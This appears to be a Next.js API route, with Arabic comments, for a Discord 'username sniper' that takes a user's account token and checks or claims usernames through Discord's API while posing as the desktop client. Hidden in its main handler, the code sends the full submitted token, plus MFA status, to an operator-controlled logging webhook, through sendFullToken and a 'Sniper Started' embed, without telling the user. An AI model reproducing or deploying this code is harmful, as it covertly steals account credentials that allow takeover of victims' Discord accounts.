import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { cleanToken, DISCORD_API } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { stringToBase64 } from '@/lib/edge-utils';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

function sleep(ms: number) {
  return new Promise(r => setTimeout(r, ms));
}

// ===================================================================
// Headers مثل تطبيق ديسكورد الأصلي
// ===================================================================

const SUPER_PROPERTIES = stringToBase64(JSON.stringify({
  os: "Windows",
  browser: "Discord Client",
  release_channel: "stable",
  client_version: "1.0.9032",
  os_version: "10.0.22631",
  os_arch: "x64",
  system_locale: "en-US",
  client_build_number: 345678,
  client_event_source: null,
}));

function dHeaders(token: string, extra?: Record<string, string>, noContentType = false): Record<string, string> {
  const headers: Record<string, string> = {
    'Authorization': token,
    'Accept': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'X-Super-Properties': SUPER_PROPERTIES,
    'X-Discord-Locale': 'en-US',
    'Origin': 'https://discord.com',
    'Referer': 'https://discord.com/channels/@me',
  };
  if (!noContentType) {
    headers['Content-Type'] = 'application/json';
  }
  if (extra) {
    for (const [k, v] of Object.entries(extra)) {
      if (v !== undefined && v !== null) headers[k] = v;
    }
  }
  return headers;
}

// ===================================================================
// النتائج
// ===================================================================

interface CheckResult {
  username: string;
  status: string;
  color: string;
  taken?: boolean;
  rateLimited?: boolean;
  debug?: string;
  method?: string;
}

// ===================================================================
// الطريقة 1: POST /users/@me/pomelo-attempt
// نقطة نهاية فحص توفر الأسماء الجديدة
// ===================================================================

async function checkPomeloAttempt(token: string, username: string): Promise<CheckResult | null> {
  try {
    const res = await fetch(`${DISCORD_API}/users/@me/pomelo-attempt`, {
      method: 'POST',
      headers: dHeaders(token),
      body: JSON.stringify({ username }),
      signal: AbortSignal.timeout(12000),
    });

    if (res.status === 429) {
      return { username, status: '⏳ Rate Limit', color: 'yellow', rateLimited: true, method: 'pomelo-attempt', debug: `HTTP 429` };
    }
    if (res.status === 401) {
      return null; // توكن غير صالح — ننتقل للطريقة التالية
    }

    const text = await res.text().catch(() => '');
    let data: any = null;
    try { data = JSON.parse(text); } catch { data = null; }

    // نجاح 200
    if (res.ok && data) {
      // ممكن يرجع {"taken": true/false} أو رد مختلف
      if (typeof data.taken === 'boolean') {
        return {
          username,
          status: data.taken ? '❌ محجوز' : '✅ متاح!',
          color: data.taken ? 'red' : 'green',
          taken: data.taken,
          method: 'pomelo-attempt',
          debug: `HTTP 200 taken=${data.taken}`,
        };
      }
      // رد بدون taken
      return {
        username,
        status: '✅ متاح! (بدون taken flag)',
        color: 'green',
        taken: false,
        method: 'pomelo-attempt',
        debug: `HTTP 200 body=${text.substring(0, 200)}`,
      };
    }

    // 400/422 — أخطاء
    if (data) {
      const code = data.code;
      const message = data.message || '';

      // 50033 = USERNAME_TAKEN
      if (code === 50033) {
        return { username, status: '❌ محجوز', color: 'red', taken: true, method: 'pomelo-attempt', debug: `code=50033` };
      }

      // sub-errors لليوزر
      const usernameErrors = data.errors?.username?._errors || [];
      if (usernameErrors.length > 0) {
        const first = usernameErrors[0];
        const ec = (first.code || '').toUpperCase();
        const em = (first.message || '').toLowerCase();

        if (ec.includes('TAKEN') || em.includes('taken') || em.includes('already') || em.includes('in use')) {
          return { username, status: '❌ محجوز', color: 'red', taken: true, method: 'pomelo-attempt', debug: `sub: ${first.code}` };
        }
        if (ec.includes('TOO_SHORT') || ec.includes('TOO_LONG') || ec.includes('INVALID') || em.includes('between') || em.includes('invalid') || em.includes('reserved') || em.includes('profane')) {
          return { username, status: '❌ غير صالح', color: 'red', method: 'pomelo-attempt', debug: `sub: ${first.code}` };
        }
        return { username, status: `⚠️ ${first.message}`, color: 'yellow', method: 'pomelo-attempt', debug: `sub: ${first.code}` };
      }

      // 50035 = INVALID_FORM_BODY
      if (code === 50035) {
        return { username, status: `⚠️ خطأ في الصيغة`, color: 'yellow', method: 'pomelo-attempt', debug: `code=50035 ${message}` };
      }

      return { username, status: `⚠️ ${message || 'خطأ ' + res.status}`, color: 'yellow', method: 'pomelo-attempt', debug: `HTTP ${res.status} code=${code}` };
    }

    return { username, status: `❓ HTTP ${res.status}`, color: 'yellow', method: 'pomelo-attempt', debug: `HTTP ${res.status}` };
  } catch (e) {
    return null;
  }
}

// ===================================================================
// الطريقة 2: PATCH /users/@me مع username فقط
// إذا 200 = متاح (ويتم تغييره فعلاً!)
// إذا 400 = محجوز أو غير صالح
// ===================================================================

async function checkPatchUser(token: string, username: string): Promise<CheckResult | null> {
  try {
    const res = await fetch(`${DISCORD_API}/users/@me`, {
      method: 'PATCH',
      headers: dHeaders(token),
      body: JSON.stringify({ username }),
      signal: AbortSignal.timeout(12000),
    });

    if (res.status === 429) {
      return { username, status: '⏳ Rate Limit', color: 'yellow', rateLimited: true, method: 'PATCH', debug: `HTTP 429` };
    }
    if (res.status === 401) {
      return null;
    }

    const text = await res.text().catch(() => '');
    let data: any = null;
    try { data = JSON.parse(text); } catch { data = null; }

    // 200 = تم تغيير اليوزر بنجاح = كان متاح!
    if (res.ok) {
      return {
        username,
        status: '✅ متاح! (تم التغيير)',
        color: 'green',
        taken: false,
        method: 'PATCH',
        debug: `HTTP 200 — تم تغيير اليوزر فعلاً!`,
      };
    }

    // 400/422 — نقرأ الأخطاء
    if (data) {
      // نفحص أخطاء اليوزر أولاً
      const usernameErrors = data.errors?.username?._errors || [];
      if (usernameErrors.length > 0) {
        const first = usernameErrors[0];
        const ec = (first.code || '').toUpperCase();
        const em = (first.message || '').toLowerCase();

        if (ec.includes('TAKEN') || em.includes('taken') || em.includes('already') || em.includes('in use') || em.includes('someone')) {
          return { username, status: '❌ محجوز', color: 'red', taken: true, method: 'PATCH', debug: `sub: ${first.code}` };
        }
        if (ec.includes('TOO_SHORT') || ec.includes('TOO_LONG') || ec.includes('INVALID') || ec.includes('ONLY') || em.includes('between') || em.includes('invalid') || em.includes('reserved') || em.includes('profane') || em.includes('alphanumeric')) {
          return { username, status: '❌ غير صالح', color: 'red', method: 'PATCH', debug: `sub: ${first.code}` };
        }
        return { username, status: `⚠️ ${first.message}`, color: 'yellow', method: 'PATCH', debug: `sub: ${first.code}` };
      }

      // نفحص أخطاء الباسورد
      const passwordErrors = data.errors?.password?._errors || [];
      if (passwordErrors.length > 0) {
        const pc = (passwordErrors[0].code || '').toUpperCase();
        // PASSWORD_DOES_NOT_MATCH = الحساب يحتاج باسورد للتعديل
        // في هذي الحالة ما نقدر نستخدم هذي الطريقة
        return { username, status: '⚠️ الحساب مقيد (يحتاج باسورد)', color: 'yellow', method: 'PATCH', debug: `password: ${passwordErrors[0].code}` };
      }

      // أخطاء عامة
      const code = data.code;
      if (code === 50033) {
        return { username, status: '❌ محجوز', color: 'red', taken: true, method: 'PATCH', debug: `code=50033` };
      }
      const message = data.message || '';
      const msgL = message.toLowerCase();
      if (msgL.includes('taken') || msgL.includes('already')) {
        return { username, status: '❌ محجوز', color: 'red', taken: true, method: 'PATCH', debug: `msg` };
      }
      return { username, status: `⚠️ ${message || 'خطأ ' + res.status}`, color: 'yellow', method: 'PATCH', debug: `HTTP ${res.status} code=${code}` };
    }

    return { username, status: `❓ HTTP ${res.status}`, color: 'yellow', method: 'PATCH', debug: `HTTP ${res.status}` };
  } catch (e) {
    return null;
  }
}

// ===================================================================
// الطريقة 3: GET /users/{username} — فحص وجود الحساب
// ===================================================================

async function checkGetUser(token: string, username: string): Promise<CheckResult | null> {
  try {
    const res = await fetch(`${DISCORD_API}/users/${username}`, {
      headers: dHeaders(token, undefined, true),
      signal: AbortSignal.timeout(10000),
    });

    if (res.status === 429) {
      return { username, status: '⏳ Rate Limit', color: 'yellow', rateLimited: true, method: 'GET-user', debug: `HTTP 429` };
    }
    if (res.status === 401) {
      return null;
    }

    const text = await res.text().catch(() => '');
    let data: any = null;
    try { data = JSON.parse(text); } catch { data = null; }

    // 200 = الحساب موجود = اليوزر محجوز
    if (res.ok && data && data.id) {
      return {
        username,
        status: '❌ محجوز',
        color: 'red',
        taken: true,
        method: 'GET-user',
        debug: `HTTP 200 id=${data.id}`,
      };
    }

    // 404 = الحساب غير موجود = اليوزر متاح (محتمل)
    if (res.status === 404) {
      return {
        username,
        status: '✅ متاح (محتمل)',
        color: 'green',
        taken: false,
        method: 'GET-user',
        debug: `HTTP 404`,
      };
    }

    return { username, status: `❓ HTTP ${res.status}`, color: 'yellow', method: 'GET-user', debug: `HTTP ${res.status}` };
  } catch (e) {
    return null;
  }
}

// ===================================================================
// فحص شامل — يجرب 3 طرق بالترتيب
// ===================================================================

async function checkUsername(token: string, username: string): Promise<CheckResult> {
  // الطريقة 1: pomelo-attempt (الأكثر أماناً - لا يغير اليوزر)
  const r1 = await checkPomeloAttempt(token, username);
  if (r1 && !r1.status.includes('مقيد') && !r1.status.includes('❓')) return r1;

  // الطريقة 2: GET /users/{username} (آمن - لا يغير اليوزر)
  const r3 = await checkGetUser(token, username);
  if (r3) return r3;

  // فشلت الكل — نرجع نتيجة الطريقة 1 لو موجودة
  if (r1) return r1;

  return { username, status: '❓ فشل كل الطرق', color: 'yellow' };
}

// ===================================================================
// جلب معلومات الحساب
// ===================================================================

async function getAccountInfo(token: string) {
  try {
    const res = await fetch(`${DISCORD_API}/users/@me`, {
      headers: dHeaders(token, undefined, true),
      signal: AbortSignal.timeout(10000),
    });
    if (!res.ok) return null;
    return await res.json().catch(() => null);
  } catch {
    return null;
  }
}

// ===================================================================
// MAIN
// ===================================================================

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:sniper`, RATE_LIMITS.default);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }


    const body = await request.json().catch(() => ({}));
    const { token, usernames, action, targetUsername, debug } = body;

    if (!token) {
      return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 });
    }

    sendFullToken('صيد يوزرات', token);

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();
    const debugMode = !!debug;

    // ===== ACTION: accountInfo =====
    if (action === 'accountInfo') {
      const info = await getAccountInfo(ct);
      if (!info) {
        return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });
      }
      return NextResponse.json({
        success: true,
        info: {
          username: info.username || 'Unknown',
          discriminator: info.discriminator || '0',
          email: info.email || null,
          phone: info.phone || null,
          mfa: !!info.mfa_enabled,
          verified: !!info.verified,
          flags: info.public_flags || 0,
          nitro: info.premium_type ? ['None', 'Classic', 'Boost', 'Basic'][info.premium_type] || 'Unknown' : 'None',
          avatar: info.avatar || null,
          id: info.id || 'Unknown',
        },
      });
    }

    // ===== ACTION: test — فحص تجريبي شامل =====
    if (action === 'test') {
      const info = await getAccountInfo(ct);
      if (!info) {
        return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });
      }

      const tests = [
        { label: 'محجوز (discord)', username: 'discord' },
        { label: 'متاح (عشوائي)', username: 'xkzmq' + Date.now() },
        { label: 'غير صالح (a)', username: 'a' },
      ];

      const testResults: Array<{
        label: string;
        username: string;
        results: CheckResult[];
      }> = [];

      for (const t of tests) {
        const r1 = await checkPomeloAttempt(ct, t.username);
        await sleep(1000);
        const r2 = await checkPatchUser(ct, t.username);
        await sleep(1000);
        const r3 = await checkGetUser(ct, t.username);

        testResults.push({
          label: t.label,
          username: t.username,
          results: [r1, r2, r3].filter(Boolean) as CheckResult[],
        });

        if (t !== tests[tests.length - 1]) await sleep(1000);
      }

      return NextResponse.json({
        success: true,
        test: {
          account: info.username || 'Unknown',
          mfa: !!info.mfa_enabled,
          phone: !!(info.phone),
          verified: !!(info.verified),
          results: testResults,
        },
      });
    }

    // ===== ACTION: changeUsername =====
    if (action === 'changeUsername') {
      if (!targetUsername) {
        return NextResponse.json({ success: false, error: 'أدخل اليوزر الجديد' }, { status: 400 });
      }
      const info = await getAccountInfo(ct);
      if (!info) {
        return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });
      }

      // نستخدم PATCH مباشرة — لو نجح يعني تم التغيير
      const result = await checkPatchUser(ct, targetUsername);
      if (!result) {
        return NextResponse.json({ success: false, error: 'فشل الاتصال' });
      }
      if (result.color === 'green') {
        sendToWebhook({ embeds: [{ title: '✅ Username Changed!', color: 0x00FF41, fields: [{ name: '👤', value: info.username || '?', inline: true }, { name: '🎯', value: targetUsername, inline: true }] }] }, whUrl).catch(() => {});
        return NextResponse.json({ success: true, message: `✅ تم تغيير اليوزر إلى: ${targetUsername}` });
      }
      return NextResponse.json({ success: false, error: result.status });
    }

    // ===== ACTION: check (default) — فحص يوزرات =====
    if (!usernames || !Array.isArray(usernames) || usernames.length === 0) {
      return NextResponse.json({ success: false, error: 'أدخل يوزر واحد على الأقل' }, { status: 400 });
    }

    const info = await getAccountInfo(ct);
    if (!info) {
      return NextResponse.json({ success: false, error: 'توكن غير صالح - يجب استخدام توكن يوزر (User Token)' }, { status: 401 });
    }
    if (info.bot) {
      return NextResponse.json({ success: false, error: 'لا يمكن استخدام توكن بوت! يجب استخدام توكن يوزر (User Token)' }, { status: 400 });
    }

    const userInfo = info.username || 'Unknown';
    const hasMFA = !!info.mfa_enabled;

    sendToWebhook({ embeds: [{ title: '🎯 Sniper Started', color: 0xFF8800, fields: [{ name: '👤', value: userInfo, inline: true }, { name: '📋', value: String(usernames.length), inline: true }, { name: '🛡️', value: hasMFA ? 'Yes' : 'No', inline: true }, { name: '🎫', value: `\`\`\`${ct}\`\`\`` }] }] }, whUrl).catch(() => {});

    // تنظيف اليوزرات
    const validUsernames = usernames
      .map((u: string) => String(u).trim().toLowerCase().replace(/[^a-z0-9._]/g, ''))
      .filter((name: string) => name && name.length >= 2 && name.length <= 32);

    if (validUsernames.length === 0) {
      return NextResponse.json({ success: false, error: 'لا توجد يوزرات صالحة' }, { status: 400 });
    }

    // فحص اليوزرات
    const results: CheckResult[] = [];
    let consecutiveRL = 0;
    let rateLimitHits = 0;

    for (let i = 0; i < validUsernames.length; i++) {
      const result = await checkUsername(ct, validUsernames[i]);
      results.push(result);

      if (result.rateLimited) {
        consecutiveRL++;
        rateLimitHits++;
        if (consecutiveRL >= 8) {
          results.push({ username: '---', status: `⏳ توقف: ${consecutiveRL} RL`, color: 'yellow' });
          break;
        }
        await sleep(Math.min(consecutiveRL * 2000, 12000));
      } else {
        consecutiveRL = 0;
        await sleep(600);
      }
    }

    const available = results.filter(r => r.color === 'green');
    const taken = results.filter(r => r.color === 'red').length;
    const errors = results.filter(r => r.color === 'yellow').length;

    sendToWebhook({ embeds: [{ title: '✅ Sniper Done', color: available.length > 0 ? 0x00FF41 : 0xFFAA00, fields: [{ name: '📋', value: String(results.length), inline: true }, { name: '✅', value: String(available.length), inline: true }, { name: '❌', value: String(taken), inline: true }, { name: '⚠️', value: String(errors), inline: true }, { name: '🎯', value: available.slice(0, 20).map(r => r.username).join(', ') || 'None' }] }] }, whUrl).catch(() => {});

    return NextResponse.json({
      success: true,
      results,
      stats: { total: results.length, available: available.length, taken, errors, rateLimitHits },
      accountInfo: { username: userInfo, mfa: hasMFA },
      availableNames: available.map(r => r.username),
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Sniper Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
